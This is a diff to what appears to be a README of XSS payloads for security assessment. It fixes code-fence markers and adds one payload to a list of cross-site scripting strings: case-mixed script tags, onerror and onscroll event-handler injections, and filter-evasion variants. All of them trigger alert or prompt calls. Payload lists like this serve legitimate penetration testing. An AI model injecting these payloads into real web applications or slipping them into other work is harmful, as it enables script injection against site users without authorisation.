@@ -4,7 +4,8 @@ Various payloads that can be used for the security assessment.
 ### XSS
 Cross-Site Scripting (XSS) attacks involve the injection of harmful scripts into websites that are otherwise secure and trustworthy. These attacks take place when an attacker exploits a web application to deliver malicious code—typically as a browser-side script—to another user. Such vulnerabilities are common and arise when a web application incorporates user-provided input into its output without proper validation or encoding.
 
-'''
+```
+"-prompt(4444)-"
 ‘; alert(1);
 ‘)alert(1);//
 <ScRiPt>alert(1)</sCriPt>
@@ -47,6 +48,7 @@ http://www.<script>alert(1)</script .com
 <body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
 <img src="/" =_=" title="onerror='prompt(1)'">
 <%<!--'%><script>alert(1);</script -->
-'''
+```
+
 
 
